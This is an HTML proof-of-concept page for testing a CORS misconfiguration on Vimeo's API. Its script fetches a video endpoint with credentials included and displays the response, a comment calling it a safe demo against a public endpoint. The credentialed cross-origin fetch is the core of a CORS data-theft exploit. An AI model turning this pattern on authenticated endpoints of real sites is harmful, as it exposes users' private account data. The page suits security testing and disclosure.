<!DOCTYPE html>
<html>
  <head><title>Vimeo CORS Misconfig PoC</title></head>
  <body>
    <h1>Vimeo CORS Misconfiguration Test</h1>
    <pre id="output">Loading...</pre>
    <script>
      async function test() {
        try {
          // public endpoint (safe demo)
          const res = await fetch("https://api.vimeo.com/videos/76979871", {
            credentials: "include"
          });
          const data = await res.json();
          document.getElementById("output").innerText = JSON.stringify(data, null, 2);
        } catch (e) {
          document.getElementById("output").innerText = "Error: " + e;
        }
      }
      test();
    </script>
  </body>
</html>
